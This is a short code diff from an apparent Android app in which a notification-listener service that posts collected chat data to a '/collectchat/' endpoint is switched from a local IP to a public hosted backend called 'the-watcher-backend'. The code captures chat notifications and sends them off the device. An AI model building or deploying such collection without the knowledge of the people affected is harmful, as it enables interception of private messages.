@@ -89,7 +89,7 @@ class ChatNotificationListener : NotificationListenerService() {
                     .toRequestBody("application/json".toMediaType())
 
                 val request = Request.Builder()
-                    .url("http://192.168.18.163:8000/collectchat/")
+                    .url("https://the-watcher-backend.onrender.com/collectchat/")
                     .post(body)
                     .build()
 
